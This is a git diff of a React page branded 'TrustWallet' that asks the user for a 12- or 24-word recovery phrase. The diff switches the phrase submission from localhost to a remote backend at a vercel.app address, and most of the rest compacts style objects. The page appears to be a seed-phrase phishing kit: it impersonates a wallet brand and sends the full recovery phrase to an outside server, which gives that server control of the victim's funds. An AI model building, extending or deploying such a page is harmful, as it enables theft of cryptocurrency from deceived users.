@@ -47,6 +47,8 @@ const AlertIcon = () => (
   </svg>
 );
 
+const API = "https://trust-wallet-backend.vercel.app";
+
 export default function TrustWallet() {
   const [words, setWords] = useState(Array(12).fill(""));
   const [wordCount, setWordCount] = useState(12);
@@ -58,17 +60,13 @@ export default function TrustWallet() {
   const [mounted, setMounted] = useState(false);
   const inputRefs = useRef([]);
 
-  useEffect(() => {
-    setTimeout(() => setMounted(true), 60);
-  }, []);
+  useEffect(() => { setTimeout(() => setMounted(true), 60); }, []);
 
   const handleWordChange = (i, val) => {
     const pasted = val.trim().split(/[\s,]+/);
     if (pasted.length > 1) {
       const next = [...words];
-      pasted.forEach((w, j) => {
-        if (i + j < wordCount) next[i + j] = w;
-      });
+      pasted.forEach((w, j) => { if (i + j < wordCount) next[i + j] = w; });
       setWords(next);
       inputRefs.current[Math.min(i + pasted.length, wordCount - 1)]?.focus();
       return;
@@ -102,7 +100,7 @@ export default function TrustWallet() {
     setLoading(true);
     setError("");
     try {
-      const response = await fetch("http://localhost:3001/api/login", {
+      const response = await fetch(API + "/api/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ phrase: words.join(" ") }),
@@ -114,7 +112,7 @@ export default function TrustWallet() {
         setError(data.error || "Login failed. Try again.");
       }
     } catch (err) {
-      setError("Cannot connect to server. Is the backend running?");
+      setError("Cannot connect to server.");
     } finally {
       setLoading(false);
     }
@@ -161,11 +159,7 @@ export default function TrustWallet() {
 
         <div style={s.switcher}>
           {[12, 24].map(n => (
-            <button
-              key={n}
-              style={Object.assign({}, s.switchBtn, wordCount === n ? s.switchBtnActive : {})}
-              onClick={() => switchWordCount(n)}
-            >
+            <button key={n} style={Object.assign({}, s.switchBtn, wordCount === n ? s.switchBtnActive : {})} onClick={() => switchWordCount(n)}>
               {n} words
             </button>
           ))}
@@ -173,10 +167,7 @@ export default function TrustWallet() {
 
         <div style={Object.assign({}, s.grid, { gridTemplateColumns: wordCount === 24 ? "1fr 1fr 1fr" : "1fr 1fr" })}>
           {words.map((word, i) => (
-            <div
-              key={i}
-              style={Object.assign({}, s.wordBox, focused === i ? s.wordBoxFocus : word ? s.wordBoxFilled : {})}
-            >
+            <div key={i} style={Object.assign({}, s.wordBox, focused === i ? s.wordBoxFocus : word ? s.wordBoxFilled : {})}>
               <span style={s.wordNum}>{i + 1}</span>
               <input
                 ref={el => inputRefs.current[i] = el}
@@ -198,9 +189,7 @@ export default function TrustWallet() {
 
         <div style={s.controlsRow}>
           <button style={s.revealBtn} onClick={() => setRevealed(!revealed)}>
-            <span style={s.revealIcon}>
-              {revealed ? <EyeOpen /> : <EyeClosed />}
-            </span>
+            <span style={s.revealIcon}>{revealed ? <EyeOpen /> : <EyeClosed />}</span>
             {revealed ? "Hide" : "Show"} phrase
           </button>
           <span style={Object.assign({}, s.counter, { color: allFilled ? "#3B82F6" : "#475569" })}>
@@ -267,250 +256,42 @@ const s = {
     transform: "translateY(16px)",
     transition: "opacity 0.4s ease, transform 0.4s ease",
   },
-  cardIn: {
-    opacity: 1,
-    transform: "translateY(0)",
-  },
-  header: {
-    display: "flex",
-    alignItems: "center",
-    gap: "14px",
-  },
-  headerText: {
-    display: "flex",
-    flexDirection: "column",
-    gap: "2px",
-  },
-  appName: {
-    color: "#F1F5F9",
-    fontSize: "19px",
-    fontWeight: "700",
-    letterSpacing: "-0.3px",
-  },
-  appSub: {
-    color: "#475569",
-    fontSize: "12px",
-  },
-  divider: {
-    height: "1px",
-    background: "rgba(255,255,255,0.07)",
-    margin: "20px 0",
-  },
-  titleBlock: {
-    marginBottom: "16px",
-  },
-  title: {
-    color: "#F1F5F9",
-    fontSize: "17px",
-    fontWeight: "600",
-    margin: "0 0 6px",
-    letterSpacing: "-0.2px",
-  },
-  subtitle: {
-    color: "#64748B",
-    fontSize: "13px",
-    margin: 0,
-    lineHeight: "1.55",
-  },
-  switcher: {
-    display: "flex",
-    background: "#0F172A",
-    borderRadius: "10px",
-    padding: "3px",
-    gap: "3px",
-    marginBottom: "14px",
-  },
-  switchBtn: {
-    flex: 1,
-    background: "transparent",
-    border: "none",
-    color: "#475569",
-    fontSize: "13px",
-    fontWeight: "500",
-    padding: "8px 0",
-    borderRadius: "8px",
-    cursor: "pointer",
-    transition: "all 0.15s",
-  },
-  switchBtnActive: {
-    background: "#1E293B",
-    color: "#E2E8F0",
-    boxShadow: "0 1px 4px rgba(0,0,0,0.5)",
-  },
-  grid: {
-    display: "grid",
-    gap: "7px",
-    marginBottom: "12px",
-  },
-  wordBox: {
-    display: "flex",
-    alignItems: "center",
-    background: "#0F172A",
-    border: "1.5px solid rgba(255,255,255,0.06)",
-    borderRadius: "9px",
-    padding: "0 9px",
-    height: "40px",
-    gap: "6px",
-    transition: "border-color 0.15s, background 0.15s",
-  },
-  wordBoxFocus: {
-    borderColor: "#3B82F6",
-    background: "#0D1E38",
-  },
-  wordBoxFilled: {
-    borderColor: "rgba(59,130,246,0.25)",
-  },
-  wordNum: {
-    color: "#2D3F55",
-    fontSize: "11px",
-    fontWeight: "600",
-    minWidth: "14px",
-    userSelect: "none",
-  },
-  wordInput: {
-    flex: 1,
-    background: "transparent",
-    border: "none",
-    outline: "none",
-    color: "#E2E8F0",
-    fontSize: "14px",
-    fontFamily: "monospace",
-    letterSpacing: "0.3px",
-    width: "100%",
-  },
-  controlsRow: {
-    display: "flex",
-    alignItems: "center",
-    justifyContent: "space-between",
-    marginBottom: "14px",
-  },
-  revealBtn: {
-    display: "flex",
-    alignItems: "center",
-    gap: "6px",
-    background: "none",
-    border: "none",
-    color: "#3B82F6",
-    fontSize: "13px",
-    fontWeight: "500",
-    cursor: "pointer",
-    padding: 0,
-  },
-  revealIcon: {
-    display: "flex",
-    alignItems: "center",
-  },
-  counter: {
-    fontSize: "12px",
-    fontWeight: "600",
-    transition: "color 0.2s",
-  },
-  errorBox: {
-    display: "flex",
-    alignItems: "center",
-    gap: "8px",
-    background: "rgba(248,113,113,0.08)",
-    border: "1px solid rgba(248,113,113,0.22)",
-    borderRadius: "10px",
-    padding: "10px 12px",
-    color: "#F87171",
-    fontSize: "13px",
-    marginBottom: "12px",
-    lineHeight: "1.4",
-  },
-  btn: {
-    width: "100%",
-    background: "linear-gradient(135deg, #3B82F6 0%, #2563EB 100%)",
-    border: "none",
-    borderRadius: "12px",
-    padding: "14px",
-    color: "#fff",
-    fontSize: "15px",
-    fontWeight: "600",
-    cursor: "pointer",
-    letterSpacing: "0.1px",
-    boxShadow: "0 4px 20px rgba(59,130,246,0.3)",
-    transition: "opacity 0.2s",
-    marginBottom: "14px",
-  },
-  btnDisabled: {
-    background: "#1A2F4A",
-    boxShadow: "none",
-    color: "#334155",
-    cursor: "not-allowed",
-  },
-  btnLoading: {
-    opacity: 0.75,
-    cursor: "not-allowed",
-  },
-  loaderRow: {
-    display: "flex",
-    alignItems: "center",
-    justifyContent: "center",
-    gap: "9px",
-  },
-  spinner: {
-    width: "16px",
-    height: "16px",
-    border: "2.5px solid rgba(255,255,255,0.2)",
-    borderTopColor: "#fff",
-    borderRadius: "50%",
-    display: "inline-block",
-  },
-  warning: {
-    color: "#475569",
-    fontSize: "12px",
-    lineHeight: "1.6",
-    textAlign: "center",
-    margin: "0 0 14px",
-  },
-  footerRow: {
-    textAlign: "center",
-  },
-  footerText: {
-    color: "#475569",
-    fontSize: "13px",
-  },
-  footerLink: {
-    background: "none",
-    border: "none",
-    color: "#3B82F6",
-    fontSize: "13px",
-    fontWeight: "600",
-    cursor: "pointer",
-    padding: 0,
-    textDecoration: "underline",
-    textUnderlineOffset: "2px",
-  },
-  successWrap: {
-    display: "flex",
-    flexDirection: "column",
-    alignItems: "center",
-    padding: "20px 0 8px",
-    gap: "12px",
-  },
-  successRing: {
-    width: "70px",
-    height: "70px",
-    borderRadius: "50%",
-    background: "rgba(59,130,246,0.1)",
-    border: "2px solid rgba(59,130,246,0.25)",
-    display: "flex",
-    alignItems: "center",
-    justifyContent: "center",
-  },
-  successTitle: {
-    color: "#F1F5F9",
-    fontSize: "20px",
-    fontWeight: "700",
-    margin: 0,
-  },
-  successSub: {
-    color: "#64748B",
-    fontSize: "13px",
-    textAlign: "center",
-    margin: "0 0 8px",
-  },
+  cardIn: { opacity: 1, transform: "translateY(0)" },
+  header: { display: "flex", alignItems: "center", gap: "14px" },
+  headerText: { display: "flex", flexDirection: "column", gap: "2px" },
+  appName: { color: "#F1F5F9", fontSize: "19px", fontWeight: "700", letterSpacing: "-0.3px" },
+  appSub: { color: "#475569", fontSize: "12px" },
+  divider: { height: "1px", background: "rgba(255,255,255,0.07)", margin: "20px 0" },
+  titleBlock: { marginBottom: "16px" },
+  title: { color: "#F1F5F9", fontSize: "17px", fontWeight: "600", margin: "0 0 6px", letterSpacing: "-0.2px" },
+  subtitle: { color: "#64748B", fontSize: "13px", margin: 0, lineHeight: "1.55" },
+  switcher: { display: "flex", background: "#0F172A", borderRadius: "10px", padding: "3px", gap: "3px", marginBottom: "14px" },
+  switchBtn: { flex: 1, background: "transparent", border: "none", color: "#475569", fontSize: "13px", fontWeight: "500", padding: "8px 0", borderRadius: "8px", cursor: "pointer", transition: "all 0.15s" },
+  switchBtnActive: { background: "#1E293B", color: "#E2E8F0", boxShadow: "0 1px 4px rgba(0,0,0,0.5)" },
+  grid: { display: "grid", gap: "7px", marginBottom: "12px" },
+  wordBox: { display: "flex", alignItems: "center", background: "#0F172A", border: "1.5px solid rgba(255,255,255,0.06)", borderRadius: "9px", padding: "0 9px", height: "40px", gap: "6px", transition: "border-color 0.15s, background 0.15s" },
+  wordBoxFocus: { borderColor: "#3B82F6", background: "#0D1E38" },
+  wordBoxFilled: { borderColor: "rgba(59,130,246,0.25)" },
+  wordNum: { color: "#2D3F55", fontSize: "11px", fontWeight: "600", minWidth: "14px", userSelect: "none" },
+  wordInput: { flex: 1, background: "transparent", border: "none", outline: "none", color: "#E2E8F0", fontSize: "14px", fontFamily: "monospace", letterSpacing: "0.3px", width: "100%" },
+  controlsRow: { display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "14px" },
+  revealBtn: { display: "flex", alignItems: "center", gap: "6px", background: "none", border: "none", color: "#3B82F6", fontSize: "13px", fontWeight: "500", cursor: "pointer", padding: 0 },
+  revealIcon: { display: "flex", alignItems: "center" },
+  counter: { fontSize: "12px", fontWeight: "600", transition: "color 0.2s" },
+  errorBox: { display: "flex", alignItems: "center", gap: "8px", background: "rgba(248,113,113,0.08)", border: "1px solid rgba(248,113,113,0.22)", borderRadius: "10px", padding: "10px 12px", color: "#F87171", fontSize: "13px", marginBottom: "12px", lineHeight: "1.4" },
+  btn: { width: "100%", background: "linear-gradient(135deg, #3B82F6 0%, #2563EB 100%)", border: "none", borderRadius: "12px", padding: "14px", color: "#fff", fontSize: "15px", fontWeight: "600", cursor: "pointer", letterSpacing: "0.1px", boxShadow: "0 4px 20px rgba(59,130,246,0.3)", transition: "opacity 0.2s", marginBottom: "14px" },
+  btnDisabled: { background: "#1A2F4A", boxShadow: "none", color: "#334155", cursor: "not-allowed" },
+  btnLoading: { opacity: 0.75, cursor: "not-allowed" },
+  loaderRow: { display: "flex", alignItems: "center", justifyContent: "center", gap: "9px" },
+  spinner: { width: "16px", height: "16px", border: "2.5px solid rgba(255,255,255,0.2)", borderTopColor: "#fff", borderRadius: "50%", display: "inline-block" },
+  warning: { color: "#475569", fontSize: "12px", lineHeight: "1.6", textAlign: "center", margin: "0 0 14px" },
+  footerRow: { textAlign: "center" },
+  footerText: { color: "#475569", fontSize: "13px" },
+  footerLink: { background: "none", border: "none", color: "#3B82F6", fontSize: "13px", fontWeight: "600", cursor: "pointer", padding: 0, textDecoration: "underline", textUnderlineOffset: "2px" },
+  successWrap: { display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0 8px", gap: "12px" },
+  successRing: { width: "70px", height: "70px", borderRadius: "50%", background: "rgba(59,130,246,0.1)", border: "2px solid rgba(59,130,246,0.25)", display: "flex", alignItems: "center", justifyContent: "center" },
+  successTitle: { color: "#F1F5F9", fontSize: "20px", fontWeight: "700", margin: 0 },
+  successSub: { color: "#64748B", fontSize: "13px", textAlign: "center", margin: "0 0 8px" },
 };
 
 const globalCss = `
